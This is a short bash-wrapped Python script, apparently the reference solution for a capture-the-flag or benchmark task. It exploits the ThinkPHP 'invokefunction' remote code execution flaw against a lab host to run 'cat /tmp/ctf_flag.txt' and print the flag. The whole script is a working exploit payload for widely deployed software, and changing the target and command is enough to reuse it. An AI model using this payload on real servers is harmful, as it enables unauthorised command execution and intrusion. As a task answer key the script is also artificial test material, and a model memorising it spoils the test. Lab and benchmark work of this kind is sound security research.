#!/usr/bin/env bash
set -euo pipefail
python3 - <<'PY'
import re, sys, time, urllib.parse, urllib.request
base = "http://web:80/index.php"
for _ in range(30):
    try:
        query = urllib.parse.urlencode({
            "s": r"/Index/\think\app/invokefunction",
            "function": "call_user_func_array",
            "vars[0]": "system",
            "vars[1][]": "cat /tmp/ctf_flag.txt",
        })
        text = urllib.request.urlopen(f"{base}?{query}", timeout=60).read().decode("utf-8", "replace")
        m = re.search(r"flag_[a-z0-9]{20}", text)
        if m:
            print(m.group(0)); sys.exit(0)
    except Exception:
        pass
    time.sleep(3)
print("oracle_solution: ThinkPHP exploit did not return a flag", file=sys.stderr)
sys.exit(1)
PY
